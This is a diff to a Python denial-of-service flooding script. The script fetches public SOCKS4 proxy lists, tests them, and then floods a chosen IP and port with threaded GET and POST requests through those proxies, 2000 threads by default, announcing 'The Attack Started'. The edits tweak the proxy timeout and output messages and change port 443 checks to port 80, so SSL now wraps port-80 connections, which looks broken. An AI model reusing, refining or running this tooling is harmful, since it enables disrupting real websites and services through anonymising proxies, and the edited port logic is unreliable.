@@ -175,7 +175,7 @@ strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 def clone():
     f = open("socks4.txt", 'wb')
     try:
-        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=700")
+        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=500")
         f.write(r.content)
     except:
         pass
@@ -217,8 +217,8 @@ def main():
         print("[✓] Port 80 Has Been Selected")
     else:
         port = int(port)
-    if port == 443:
-        print("[✓] Port 443 Has Been Selected")        
+    if port == 80:
+        print("[✓] Port 80 Has Been Selected")        
     th_num = str(input("[+] Threads (default=2000) : "))
     if th_num == "":
         th_num = int(2000)
@@ -267,7 +267,7 @@ def get():
         try:
             socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
             s = socks.socksocket()
-            if port == 443:
+            if port == 80:
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s,server_hostname=str(ip))
             s.connect((str(ip), int(port)))
@@ -289,7 +289,7 @@ def post():
         try:
             socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
             s = socks.socksocket()
-            if port == 443:
+            if port == 80:
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s,server_hostname=str(ip))
             s.connect((str(ip), int(port)))
@@ -318,7 +318,7 @@ def checking(lines,):
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.settimeout(1)
 			s.connect((str(ip), int(port)))
-			if port==443:
+			if port==80:
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=ip)
 			#s.connect((str(ip), int(port)))
@@ -343,7 +343,7 @@ def check_socks():
 		th.join()
 		sys.stdout.write("[+] Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
-	print("\r\nChecked all proxies, Total Worked:"+str(len(proxies)))
+	print("\r\n[+] Checked All Proxies --> Total Worked : "+str(len(proxies)))
 	with open("socks4.txt", 'wb') as fp:
 		for lines in list(proxies):
 			fp.write(bytes(lines,encoding='utf8'))
@@ -367,7 +367,7 @@ while True:
             if n>=4:
                 n = 0
             time.sleep(0.1)
-            sys.stdout.write("["+str(key[n])+"] The Attack Started "+ip+page+":"+str(port)+"\r")
+            sys.stdout.write("["+str(key[n])+"] The Attack Started --> "+ip+page+":"+str(port)+"\r")
             sys.stdout.flush()
             n +=1
         except KeyboardInterrupt:
